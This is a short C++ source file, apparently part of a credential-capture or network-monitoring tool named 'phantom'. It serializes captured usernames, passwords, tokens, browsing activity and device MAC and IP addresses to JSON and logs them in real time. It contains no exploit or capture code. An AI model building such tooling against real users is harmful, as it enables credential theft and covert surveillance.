#include "json_utils.h"
#include "logger.h"
#include <nlohmann/json.hpp>

namespace phantom {

std::string ActivityToJson(const ParsedActivity& activity) {
    nlohmann::json j;
    j["app"] = activity.app_label;
    j["activity"] = activity.activity_label;
    j["title"] = activity.title;
    j["url"] = activity.url;
    j["page_url"] = activity.page_url;
    j["username"] = activity.username;
    return j.dump();
}

std::string CredentialToJson(const CapturedCredential& cred) {
    nlohmann::json j;
    j["service"] = cred.service;
    j["type"] = cred.credential_type;
    j["username"] = cred.username;
    j["password"] = cred.password;
    j["token"] = cred.token;
    j["url"] = cred.url;
    return j.dump();
}

std::string DeviceToJson(const DeviceInfo& dev) {
    nlohmann::json j;
    j["hostname"] = dev.hostname;
    j["mac"] = dev.mac.ToString();
    j["ip"] = dev.ip.ToString();
    j["vendor"] = dev.vendor;
    return j.dump();
}

std::string PrintActivityRealtime(const ParsedActivity& activity) {
    std::string line = ActivityToJson(activity);
    LOG_ACTIVITY(line);
    return line;
}

std::string PrintCredentialRealtime(const CapturedCredential& cred) {
    std::string line = CredentialToJson(cred);
    LOG_CREDENTIAL(line);
    return line;
}

} // namespace phantom
